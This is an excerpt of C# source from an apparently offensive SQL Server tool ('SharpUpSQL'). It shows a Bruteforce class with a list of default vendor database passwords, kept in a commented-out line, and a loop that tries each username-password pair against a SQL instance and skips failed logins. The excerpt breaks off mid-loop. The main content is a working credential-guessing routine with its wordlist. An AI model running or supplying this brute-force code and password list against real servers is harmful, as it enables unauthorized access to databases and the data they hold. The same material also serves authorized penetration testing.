...
namespace SharpUpSQL
{
    class Bruteforce
    {
        ...
        //public static List<string> PasswordList = new List<string>(new string[] { "sa", "admin", "superadmin", "password", "sa_admin", "default", "admin", "RPSsql12345", "$ei$micMicro", "N'*ARIS!1dm9n#'", "BPMS", "opengts", "PracticeUser1", "42Emerson42Eme", "sqlserver", "Cardio.Perfect", "vantage12!", "netxms", "AIMS", "AIMS", "$easyWinArt4", "DBA!sa@EMSDB123", "V4in$ight", "Pass@123", "trinity", "MULTIMEDIA", "SilkCentral12!34", "stream-1", "cic", "cic", "cic!23456789", "cic!23456789", "Administrator1", "M3d!aP0rtal", "splendidcrm2005", "gnos", "Dr8gedog", "dr8gedog", "Password123", "DBA!sa@EMSDB123", "SECAdmin1", "skf_admin1", "SecurityMaster08", "SecurityMaster08", "", "wasadmin", "maxadmin", "mxintadm", "maxreg", "capassword", "i2b2metadata", "i2b2demodata", "i2b2workdata", "i2b2metadata2", "i2b2demodata2", "i2b2workdata2", "i2b2hive", "medocheck123", "pwddbo", "pwddbo", "pwAdmin", "wwAdmin", "pwPower", "wwPower", "pwUser", "wwUser", "#SAPassword!" });
        ...
        public static void bruteforceSQL(string sqlInstanceParsedName, string sqlInstanceParsedPort, bool checkRights)
        {
            foreach (string sqlUsername in Bruteforce.UsernameList)
            {
                foreach (string sqlPassword in Bruteforce.PasswordList)
                {
                    try
                    {
                        SqlConnection cnn = SQLConnect.sqlConnect(sqlInstanceParsedName, sqlInstanceParsedPort, sqlUsername, sqlPassword, checkRights);
                    }
                    catch (SqlException)
                    {
                        continue;
